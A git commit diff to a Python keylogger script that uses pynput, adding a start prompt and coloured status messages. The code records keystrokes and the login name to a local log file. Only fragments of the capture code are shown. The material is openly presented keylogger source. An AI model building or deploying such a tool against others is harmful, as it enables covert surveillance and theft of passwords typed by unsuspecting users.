0129ba7f56cbbc99089e64293d584817181b24a6
superlemon <chichou@mail.fr>
2021-04-04 15:51:16 +0200

    Update keylogger.py

--- keylogger.py
+++ keylogger.py
@@ -2,10 +2,14 @@ from pynput.keyboard import Listener
 import logging
 import os
 import time
+from termcolor import colored
 
 file = "keylogs.txt"
 time = time.asctime()
 username = os.getlogin()
+
+input(colored('Press ' + '\033[1mENTER\033[0m' +
+              ' to start the keylogger or ' + '\033[1mCTRL + C\033[0m ' + 'to stop..'))
 
 
 def logstarted():
@@ -24,10 +28,12 @@ print('''
 █████╔╝ ██║     
 ██╔═██╗ ██║     
 ██║  ██╗███████╗
-╚═╝  ╚═╝╚══════╝ by superlemon            
+╚═╝  ╚═╝╚══════╝ by superlemon 
 
 ''')
-print('--keylogger started--')
+print(colored('--keylogger started, CTRL + C to stop--',
+              'green', attrs=['bold']))
+
 print('see logs on ./keylogs.txt')
 logging.basicConfig(filename=file, level=logging.DEBUG,
                     format="%(asctime)s %(message)s")
